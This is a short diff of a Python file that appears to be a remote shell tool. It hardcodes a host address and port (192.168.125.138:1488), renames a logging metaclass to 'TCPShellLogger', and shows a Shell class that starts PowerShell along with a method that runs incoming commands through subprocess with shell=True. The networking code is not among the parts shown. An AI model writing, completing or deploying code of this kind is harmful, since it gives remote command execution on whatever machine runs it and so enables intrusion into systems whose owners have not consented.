@@ -4,23 +4,23 @@ import sys
 import logging
 from typing import BinaryIO, Union
 
-HOST: str = ""
-PORT: int = 1337
+HOST: str = "192.168.125.138"
+PORT: int = 1488
 ENCODING: str = 'cp1251'
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
 
-class LoggingMeta(type):
+class TCPShellLogger(type):
     def __new__(cls, name, bases, attrs):
         for attr_name, attr_value in attrs.items():
             if callable(attr_value):
-                attrs[attr_name] = cls.decorate_with_logging(attr_value)
+                attrs[attr_name] = cls.shell_logger(attr_value)
         return super().__new__(cls, name, bases, attrs)
 
     @staticmethod
-    def decorate_with_logging(method):
+    def shell_logger(method):
         def wrapper(*args, **kwargs):
             logger.info(f"Calling {method.__name__}")
             return method(*args, **kwargs)
@@ -34,7 +34,7 @@ def log_method(func):
     return wrapper
 
 
-class Shell(metaclass=LoggingMeta):
+class Shell(metaclass=TCPShellLogger):
     def __init__(self) -> None:
         try:
             self._start_powershell()
@@ -100,7 +100,9 @@ class ParentProcess:
 
     def _execute_command(self, command: str) -> Union[str, bytes]:
         try:
-            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, encoding=ENCODING)
+            result = subprocess.check_output(
+                command, shell=True, stderr=subprocess.STDOUT, encoding=ENCODING
+            )
         except subprocess.CalledProcessError as e:
             result = str(e.output)
         except UnicodeDecodeError as e:
